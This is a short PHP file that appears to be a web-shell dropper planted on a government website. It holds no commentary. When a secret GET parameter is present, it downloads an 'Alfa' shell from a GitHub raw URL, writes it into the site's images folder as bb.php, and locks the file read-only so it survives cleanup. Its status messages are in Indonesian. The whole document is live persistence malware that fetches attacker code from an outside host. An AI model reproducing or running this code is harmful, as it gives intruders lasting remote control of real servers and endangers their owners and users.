<?php

if (isset($_GET['mainbatosay'])) {
    $dirPath = '/home/admin/domains/ministeroffice.moph.go.th/public_html/images/employee/Politics';
    $filePath = $dirPath . '/bb.php';

    $url = 'https://raw.githubusercontent.com/kurtcobain555/fileshell/main/alfashell.txt?token=GHSAT0AAAAAACUAWJI34FEXYEPWW2ESQDRQZT2T7OQ';

    $desiredPermission = 0444;

    if (!is_dir($dirPath)) {
        if (!mkdir($dirPath, 0755, true)) {
            die("Gagal membuat direktori $dirPath");
        }
    }

    $remoteContent = file_get_contents($url);

    if ($remoteContent === false) {
        echo "Gagal mengambil konten dari URL.\n";
        exit;
    }

    if (file_exists($filePath)) {
        $localContent = file_get_contents($filePath);

        if ($localContent !== $remoteContent) {
            if (file_put_contents($filePath, $remoteContent) !== false) {
                echo "Isi file berhasil diperbarui.\n";
            } else {
                echo "Gagal memperbarui isi file.\n";
            }
        } else {
            echo "Isi file sudah sama dengan konten dari URL.\n";
        }

        $filePermission = fileperms($filePath);

        if (($filePermission & 0777) !== $desiredPermission) {
            if (chmod($filePath, $desiredPermission)) {
                echo "Izin file telah diubah menjadi 444.\n";
            } else {
                echo "Gagal mengubah izin file.\n";
            }
        }
    } else {
        if (file_put_contents($filePath, $remoteContent) !== false) {
            if (chmod($filePath, $desiredPermission)) {
                echo "File berhasil dibuat dengan konten dari URL dan izin 444.\n";
            } else {
                echo "File berhasil dibuat tetapi tidak mengubah izinnya.\n";
            }
        } else {
            echo "Gagal membuat file.\n";
        }
    }
}
?>
